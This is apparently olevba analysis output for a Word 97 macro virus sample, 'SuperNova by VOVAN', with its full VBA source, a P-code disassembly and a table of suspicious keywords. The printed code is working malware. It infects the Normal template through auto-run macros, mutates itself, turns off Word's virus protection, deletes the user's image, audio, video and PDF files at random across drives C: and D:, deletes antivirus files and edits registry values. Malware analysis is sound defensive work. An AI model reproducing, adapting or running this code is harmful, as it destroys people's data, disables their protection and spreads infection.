olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vovan.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vovan.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xxx.bas 
in file: Virus.MSWord.Vovan.c - OLE stream: 'Macros/VBA/xxx'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'MacroWord97.SuperNova by VOVAN
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sub AutoOpen()
On Error Resume Next
Polymorphic
Application.ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub AutoExit()
On Error Resume Next
Application.ScreenUpdating = False
Options.SaveNormalPrompt = False
If Day(Now()) = Month(Now()) Then Call Abc
If Day(Now()) = Minute(Now()) Then Call Abc
If Day(Now()) = Hour(Now()) Then Call Abc
If Day(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Minute(Now()) Then Call Abc
If Hour(Now()) = WeekDay(Now()) Then Call Abc
If Hour(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = Month(Now()) Then Call Abc
If Minute(Now()) = WeekDay(Now()) Then Call Abc
If Month(Now()) = WeekDay(Now()) Then Call Abc
Options.VirusProtection = True
End Sub
Sub AutoExec()
On Error Resume Next
Options.VirusProtection = False
End Sub
Sub FileOpen()
On Error Resume Next
WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Call FileSave
End Sub
Sub FileSave()
On Error Resume Next
Application.ScreenUpdating = False
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
Polymorphic
ActiveDocument.Save
End Sub
'Sub FileSaveAs()
'On Error Resume Next
'Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems
'Polymorphic
'Dialogs(wdDialogFileSaveAs).Show
'End Sub
Sub ToolsMacro()
Call AntiAvp
End Sub
Sub FileTemplates()
Call AntiAvp
End Sub
Sub ViewVBcode()
Call AntiAvp
End Sub
Sub Organizer()
Call AntiAvp
End Sub
Sub ToolsRecordMacroStart()
Call AntiAvp
End Sub
Sub ToolsRecordMacroToggle()
Call AntiAvp
End Sub
Sub Polymorphic()
On Error Resume Next
xXxX = Int(Rnd() * 6 + 1)
For Mutagen = 1 To xXxX
ZzZz = Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.CountOfLines
qwer = Int(Rnd() * ZzZz + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("xxx").CodeModule.InsertLines qwer, "Rem " & a & vbTab & b & vbTab & c & vbTab & D & vbTab & e
Next Mutagen
End Sub
Sub Abc()
On Error Resume Next
Dim D
Randomize
D = Int((4 * Rnd) + 1)
If D = 1 Then GoTo Picture
If D = 2 Then GoTo Sound
If D = 3 Then GoTo Video
If D = 4 Then End
Picture:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.jpg ; *.bmp ; *.gif ; *.pcx ; *.png ; *.tif ; *.tga ; *.psd ; *.pdd ; *.iff ; *.rle ; *.eps ; *.fpx ; *.jpe ; *.ani ; *.ico ; *.cur ; *.wif ; *.dcx ; *.lbm ; *.wmf ; *.pif"
fs.Execute
For G = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(G), 0
Kill fs.FoundFiles(G)
Next G
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.pdf ; *.pct ; *.pic ; *.pxr ; *.rng ; *.raw ; *.sct ; *.vda ; *.icb ; *.vst ; *.xfp ; *.xfd ; *.lpi ; *.ans ; *.rip ; *.icl ; *.pcd ; *.xif ; *.dib ; *.jif ; *.awd ; *.lnk"
fs.Execute
For Y = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Y), 0
Kill fs.FoundFiles(Y)
Next Y
GoTo 1
Sound:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.wav ; *.mid ; *.rmi ; *.mod ; *.snd ; *.stm ; *.s3m ; *.voc ; *.mtm ; *.mpg ; *.mp2 ; *.mp3"
fs.Execute
For J = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(J), 0
Kill fs.FoundFiles(J)
Next J
GoTo 1
Video:
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "*.avi ; *.dvp ; *.mov ; *.flc ; *.fli ; *.flx ; *.mpg ; *.c3d ; *.c2d"
fs.Execute
For O = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(O), 0
Kill fs.FoundFiles(O)
Next O
1:
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Ìîé êîìïüþòåð" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Íàø êîìïüþòåð"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Íàø êîìïüþòåð"
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "My computer" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "Our computer"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "DisplayName") = "Our computer"
End If
End Sub
Sub ToolsOptions()
On Error Resume Next
With Options: .VirusProtection = True: End With
With Options: .SaveNormalPrompt = True: End With
If Dialogs(wdDialogToolsOptions).Show Then
End If
With Options: .VirusProtection = False: End With
End Sub
Sub AntiAvp()
On Error Resume Next
Set fs = Application.FileSearch
fs.LookIn = "C:\ ; D:\"
fs.SearchSubFolders = True
fs.FileName = "avp*.* ; *.avc ; drweb*.*"
fs.Execute
For Z = 1 To fs.FoundFiles.Count
SetAttr fs.FoundFiles(Z), 0
Kill fs.FoundFiles(Z)
Next Z
End Sub
'***************************************
'* Author of given MacroVirus is VOVAN *
'*         MacroVirus.Word97           *
'*         Name of SuperNova           *
'*             Ver 1.0                 *
'***************************************

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Vovan.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/xxx - 10703 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x001E "MacroWord97.SuperNova by VOVAN"
' Line #2:
' 	QuoteRem 0x0000 0x001E "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
' Line #3:
' Line #4:
' 	FuncDefn (Sub AutoOpen())
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' 	ArgsCall Polymorphic 0x0000 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #10:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub AutoExit())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #18:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #19:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #20:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #22:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #24:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #25:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Abc 0x0000 
' 	EndIf 
' Line #26:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub AutoExec())
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub FileOpen())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #35:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #36:
' 	Ld WordBasic 
' 	ArgsMemCall EnableAutoMacros 0x0000 
' Line #37:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub FileSave())
' Line #40:
' 	OnError (Resume Next) 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #42:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "xxx"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #43:
' 	ArgsCall Polymorphic 0x0000 
' Line #44:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	QuoteRem 0x0000 0x0010 "Sub FileSaveAs()"
' Line #47:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #48:
' 	QuoteRem 0x0000 0x0093 "Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="xxx", Object:=wdOrganizerObjectProjectItems"
' Line #49:
' 	QuoteRem 0x0000 0x000B "Polymorphic"
' Line #50:
' 	QuoteRem 0x0000 0x0020 "Dialogs(wdDialogFileSaveAs).Show"
' Line #51:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #52:
' 	FuncDefn (Sub ToolsMacro())
' Line #53:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub FileTemplates())
' Line #56:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub ViewVBcode())
' Line #59:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub Organizer())
' Line #62:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub ToolsRecordMacroStart())
' Line #65:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #68:
' 	ArgsCall (Call) AntiAvp 0x0000 
' Line #69:
' 	EndSub 
' Line #70:
' 	FuncDefn (Sub Polymorphic())
' Line #71:
' 	OnError (Resume Next) 
' Line #72:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0006 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St xXxX 
' Line #73:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld xXxX 
' 	For 
' Line #74:
' 	LitStr 0x0003 "xxx"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ZzZz 
' Line #75:
' 	ArgsLd Rnd 0x0000 
' 	Ld ZzZz 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St qwer 
' Line #76:
' 	Ld Rnd 
' 	LitDI2 0x01C7 
' 	Mul 
' 	St a 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0050 
' 	Mul 
' 	St B 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00A0 
' 	Mul 
' 	St c 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00B4 
' 	Mul 
' 	St D 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0031 
' 	Mul 
' 	St e 
' Line #77:
' 	Ld qwer 
' 	LitStr 0x0004 "Rem "
' 	Ld a 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld B 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld c 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld D 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0003 "xxx"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	StartForVariable 
' 	Ld Mutagen 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub Abc())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	Dim 
' 	VarDefn D
' Line #83:
' 	ArgsCall Read 0x0000 
' Line #84:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St D 
' Line #85:
' 	Ld D 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Picture 
' 	EndIf 
' Line #86:
' 	Ld D 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sound 
' 	EndIf 
' Line #87:
' 	Ld D 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Video 
' 	EndIf 
' Line #88:
' 	Ld D 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #89:
' 	Label Picture 
' Line #90:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #91:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #93:
' 	LitStr 0x00AD "*.jpg ; *.bmp ; *.gif ; *.pcx ; *.png ; *.tif ; *.tga ; *.psd ; *.pdd ; *.iff ; *.rle ; *.eps ; *.fpx ; *.jpe ; *.ani ; *.ico ; *.cur ; *.wif ; *.dcx ; *.lbm ; *.wmf ; *.pif"
' 	Ld fs 
' 	MemSt FileName 
' Line #94:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #95:
' 	StartForVariable 
' 	Ld G 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #96:
' 	Ld G 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #97:
' 	Ld G 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #98:
' 	StartForVariable 
' 	Ld G 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #100:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #101:
' 	LitStr 0x00AD "*.pdf ; *.pct ; *.pic ; *.pxr ; *.rng ; *.raw ; *.sct ; *.vda ; *.icb ; *.vst ; *.xfp ; *.xfd ; *.lpi ; *.ans ; *.rip ; *.icl ; *.pcd ; *.xif ; *.dib ; *.jif ; *.awd ; *.lnk"
' 	Ld fs 
' 	MemSt FileName 
' Line #102:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #103:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #104:
' 	Ld Y 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #105:
' 	Ld Y 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #106:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	GoTo 1 
' Line #108:
' 	Label Sound 
' Line #109:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #110:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #111:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #112:
' 	LitStr 0x005D "*.wav ; *.mid ; *.rmi ; *.mod ; *.snd ; *.stm ; *.s3m ; *.voc ; *.mtm ; *.mpg ; *.mp2 ; *.mp3"
' 	Ld fs 
' 	MemSt FileName 
' Line #113:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #114:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #115:
' 	Ld J 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #116:
' 	Ld J 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #117:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #118:
' 	GoTo 1 
' Line #119:
' 	Label Video 
' Line #120:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #121:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #122:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #123:
' 	LitStr 0x0045 "*.avi ; *.dvp ; *.mov ; *.flc ; *.fli ; *.flx ; *.mpg ; *.c3d ; *.c2d"
' 	Ld fs 
' 	MemSt FileName 
' Line #124:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #125:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #126:
' 	Ld O 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #127:
' 	Ld O 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #128:
' 	StartForVariable 
' 	Ld O 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	LineNum 1 
' 	BoS 0x0000 
' Line #130:
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000D "Ìîé êîìïüþòåð"
' 	Eq 
' 	IfBlock 
' Line #131:
' 	LitStr 0x000D "Íàø êîìïüþòåð"
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #132:
' 	LitStr 0x000D "Íàø êîìïüþòåð"
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x000B "DisplayName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000B "My computer"
' 	Eq 
' 	IfBlock 
' Line #135:
' 	LitStr 0x000C "Our computer"
' 	LitStr 0x0000 ""
' 	LitStr 0x004F "HKEY_CURRENT_USER\Software\Classes\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #136:
' 	LitStr 0x000C "Our computer"
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x000B "DisplayName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	EndSub 
' Line #139:
' 	FuncDefn (Sub ToolsOptions())
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	EndWith 
' Line #142:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #143:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	EndWith 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub AntiAvp())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #150:
' 	LitStr 0x0009 "C:\ ; D:\"
' 	Ld fs 
' 	MemSt LookIn 
' Line #151:
' 	LitVarSpecial (True)
' 	Ld fs 
' 	MemSt SearchSubFolders 
' Line #152:
' 	LitStr 0x0019 "avp*.* ; *.avc ; drweb*.*"
' 	Ld fs 
' 	MemSt FileName 
' Line #153:
' 	Ld fs 
' 	ArgsMemCall Execute 0x0000 
' Line #154:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld fs 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #155:
' 	Ld Z 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #156:
' 	Ld Z 
' 	Ld fs 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ArgsCall Kill 0x0001 
' Line #157:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #158:
' 	EndSub 
' Line #159:
' 	QuoteRem 0x0000 0x0027 "***************************************"
' Line #160:
' 	QuoteRem 0x0000 0x0027 "* Author of given MacroVirus is VOVAN *"
' Line #161:
' 	QuoteRem 0x0000 0x0027 "*         MacroVirus.Word97           *"
' Line #162:
' 	QuoteRem 0x0000 0x0027 "*         Name of SuperNova           *"
' Line #163:
' 	QuoteRem 0x0000 0x0027 "*             Ver 1.0                 *"
' Line #164:
' 	QuoteRem 0x0000 0x0027 "***************************************"
' Line #165:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

